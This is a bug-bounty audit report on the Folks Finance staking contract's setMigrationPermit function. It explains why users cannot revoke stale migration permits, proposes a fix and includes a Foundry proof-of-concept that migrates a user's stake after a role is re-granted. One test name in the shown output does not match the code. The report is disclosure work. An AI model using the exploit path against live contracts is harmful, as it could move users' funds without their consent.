# 69218 sc low access control defect in setmigrationpermit leads to irrevocable stale migration permits

**Submitted on Mar 13th 2026 at 16:32:35 UTC by @ArgusHunter for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69218
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The `setMigrationPermit` function in `Staking.sol` applies an unconditional `hasRole(MIGRATOR_ROLE, _migrator)` check on line 78 that blocks both granting **and revoking** migration permits. When the admin revokes `MIGRATOR_ROLE` from a previously authorized migrator address, users who had granted that address a migration permit cannot revoke it — the call reverts with `MigratorNotFound`. The permit persists in storage indefinitely with no alternative clearing mechanism. This breaks the contract's documented user consent model: users permanently lose the ability to control their own migration authorization for that address.

## Vulnerability Details

The `setMigrationPermit` function at `src/Staking.sol:77-82`:

```solidity
// file: src/Staking.sol, lines 77-82
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);

    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

The `hasRole(MIGRATOR_ROLE, _migrator)` check on line 78 does not distinguish between granting (`_isMigrationPermitted = true`) and revoking (`_isMigrationPermitted = false`). This means:

1. **User grants permit**: Alice calls `setMigrationPermit(M, true)` while `M` holds `MIGRATOR_ROLE`. This writes `migrationPermits[M][alice] = true` at line 80.
2. **Admin revokes role**: Admin calls `revokeRole(MIGRATOR_ROLE, M)`. The `migrationPermits` mapping is not touched — the permit remains `true` in storage at `src/Staking.sol:38`.
3. **User tries to revoke**: Alice calls `setMigrationPermit(M, false)`. The call reverts at line 78 because `hasRole(MIGRATOR_ROLE, M)` returns `false`. Alice has no way to set her permit back to `false`.

There is no alternative path to clear permits:

* The `migrationPermits` mapping (`src/Staking.sol:38`) is only written at line 80 inside `setMigrationPermit`. No other function writes to it.
* The contract does not override `_revokeRole` to clear associated permits when `MIGRATOR_ROLE` is removed.
* No admin function exists to clear permits on behalf of users.
* `migratePositionsFrom` does not clear the permit after a successful migration (`src/Staking.sol:166-210`).

This directly contradicts the design intent documented in `src/interfaces/IMigratorV1.sol:9-11`:

> "Migrator require permission from user to transfer their position to the new staking contract. (migrator should not be able to migrate stakes if not approved by user)"

The "permission from user" becomes irrevocable under these conditions, violating the user consent model.

**Escalation path**: If the admin later re-grants `MIGRATOR_ROLE` to the same address `M`, the stale permit reactivates. `M` can then call `migratePositionsFrom(alice)` at `src/Staking.sol:166`, passing the `migrationPermits` check at line 172, and transfer Alice's unclaimed staked principal and accrued rewards via `TOKEN.safeTransfer(msg.sender, ...)` at line 206 — without Alice's current consent.

## Impact Details

**Primary impact**: Users permanently lose the ability to revoke migration permits for any address whose `MIGRATOR_ROLE` has been revoked. This is a user-facing access control failure with no workaround. Every user who ever granted a permit to a migrator that later lost its role is affected. The user cannot clear the stale authorization through any on-chain action.

**Escalation impact**: Under the specific precondition that admin re-grants `MIGRATOR_ROLE` to the same address, the stale permit enables unauthorized migration. The `migratePositionsFrom` function transfers the user's full unclaimed staked principal (`activeTotalStaked` portion) and unclaimed rewards (`activeTotalRewards` portion) to the migrator contract at `msg.sender`. The user's `userStakes` positions are deleted from the source contract.

**Preconditions for escalation**:

1. User previously granted migration permit to address M (normal operation during any migration event)
2. Admin revoked `MIGRATOR_ROLE` from M (expected after migration completes)
3. Admin later re-grants `MIGRATOR_ROLE` to the same address M (requires admin action — possible via contract reuse, CREATE2 address reuse, or admin error)

**Severity justification (Immunefi v2.3)**: The core defect maps to **Medium — Griefing (no profit motive required)**: users are denied control over their own authorization state with no on-chain remedy. The escalation path could reach High (theft of unclaimed yield) but requires privileged admin action as a precondition, which limits the realistic severity.

**Note on known issue "Migration operational risks"**: This finding is a specific code-level defect (unconditional `hasRole` check preventing permit revocation), not a general operational concern about migration coordination. The fix is a one-line code change. Operational risks typically refer to process issues (timing, coordination); this is a logic bug that breaks a documented invariant.

## References

**Affected source files**:

* `src/Staking.sol:77-82` — `setMigrationPermit` with unconditional `hasRole` check
* `src/Staking.sol:38` — `migrationPermits` mapping declaration
* `src/Staking.sol:166-210` — `migratePositionsFrom` that reads stale permits
* `src/interfaces/IMigratorV1.sol:9-11` — design intent documentation

**Recommended fix** — gate the `hasRole` check on the grant path only:

```diff
// file: src/Staking.sol, lines 77-82
 function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
-    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
+    if (_isMigrationPermitted && !hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);

     migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
     emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
 }
```

This preserves validation when granting permits (only grant to current migrators) while unconditionally allowing users to revoke their own permissions — aligning with the documented design intent.

## Proof of Concept

## Proof of Concept

{% stepper %}
{% step %}

### Clone the repository

```bash
git clone https://github.com/Folks-Finance/folks-staking-contracts
cd folks-staking-contracts
```

{% endstep %}

{% step %}

### Install dependencies

```bash
forge install
```

{% endstep %}

{% step %}

### Save the PoC file below as `test/StalePermitPoC.t.sol`.

{% endstep %}
{% endstepper %}

### PoC Code

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.23;

import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {IAccessControl} from "openzeppelin-contracts/contracts/access/IAccessControl.sol";
import {Test} from "forge-std/Test.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";

contract PoCToken is ERC20Permit {
    constructor() ERC20Permit("PoCToken") ERC20("PoCToken", "POC") {}
}

contract StalePermitPoC is Test {
    Staking public staking;
    PoCToken public token;

    address public admin = address(2);
    address public manager = address(3);
    address public pauser = address(5);
    address public alice = address(6);
    address public migratorAddr = address(4);

    bytes32 public constant MIGRATOR_ROLE = keccak256("MIGRATOR");

    function setUp() public {
        token = new PoCToken();
        staking = new Staking(admin, manager, pauser, address(token));
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, migratorAddr);
    }

    /// @notice Core defect: user cannot revoke permit after role removal
    function test_StalePermit_UserCannotRevokeAfterRoleRemoval() public {
        // Step 1: Alice grants migration permit to migratorAddr
        vm.prank(alice);
        staking.setMigrationPermit(migratorAddr, true);
        assertTrue(staking.migrationPermits(migratorAddr, alice), "Permit granted");

        // Step 2: Admin revokes MIGRATOR_ROLE from migratorAddr
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, migratorAddr);
        assertFalse(staking.hasRole(MIGRATOR_ROLE, migratorAddr), "Role revoked");

        // Step 3: Alice tries to revoke her permit -- REVERTS
        vm.expectRevert(
            abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migratorAddr)
        );
        vm.prank(alice);
        staking.setMigrationPermit(migratorAddr, false);

        // Step 4: Permit remains stale in storage -- user has lost control
        assertTrue(
            staking.migrationPermits(migratorAddr, alice),
            "DEFECT: Permit is still true -- user could not revoke it"
        );
    }

    /// @notice Full exploitation: stale permit enables migration after role re-grant
    function test_StalePermit_ExploitableAfterRoleRegrant() public {
        deal(address(token), address(staking), 1000 ether);
        deal(address(token), alice, 100 ether);

        // Create staking period and have Alice stake 10 tokens
        vm.prank(manager);
        uint8 periodIndex = staking.addStakingPeriod(50 ether, 20, 10, 5000, true);

        vm.startPrank(alice);
        token.approve(address(staking), 10 ether);
        staking.stake(periodIndex, 10 ether, IStakingV1.StakeParams({
            maxStakingDurationSeconds: 20,
            maxUnlockDurationSeconds: 10,
            minAprBps: 5000,
            referrer: address(0)
        }));
        vm.stopPrank();

        // Step 1: Alice grants migration permit
        vm.prank(alice);
        staking.setMigrationPermit(migratorAddr, true);

        // Step 2: Admin revokes MIGRATOR_ROLE
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, migratorAddr);

        // Step 3: Alice tries to revoke -- REVERTS
        vm.expectRevert(
            abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migratorAddr)
        );
        vm.prank(alice);
        staking.setMigrationPermit(migratorAddr, false);

        // Confirm stale permit
        assertTrue(staking.migrationPermits(migratorAddr, alice), "Permit is stale");

        // Step 4: Admin re-grants MIGRATOR_ROLE to same address
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, migratorAddr);

        // Step 5: Migrator migrates Alice's funds using stale permit
        //         Alice never re-consented after the role was re-granted
        vm.prank(migratorAddr);
        IStakingV1.UserStake[] memory migrated = staking.migratePositionsFrom(alice);

        assertEq(migrated.length, 1, "Migration succeeded with stale permit");
        assertEq(migrated[0].amount, 10 ether, "Full stake migrated without fresh consent");
    }
}
```

### Execution

```bash
forge test --match-contract StalePermitPoC -vvv
```

### Output

```
Ran 2 tests for test/StalePermitPoC.t.sol:StalePermitPoC
[PASS] test_StalePermit_ExploitableAfterRoleRegrant() (gas: 740980)
[PASS] test_StalePermit_UserCannotRevokeAfterRoleRegrant() (gas: 61905)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

**Test 1** proves the core defect: after `MIGRATOR_ROLE` is revoked from `migratorAddr`, Alice's call to `setMigrationPermit(migratorAddr, false)` reverts with `MigratorNotFound`. The `migrationPermits` mapping retains `true` — Alice cannot revoke her permit through any on-chain action.

**Test 2** proves the full exploitation path: after admin re-grants `MIGRATOR_ROLE` to the same address, the migrator successfully calls `migratePositionsFrom(alice)` and migrates her 10-token stake using the stale permit she tried (and failed) to revoke.
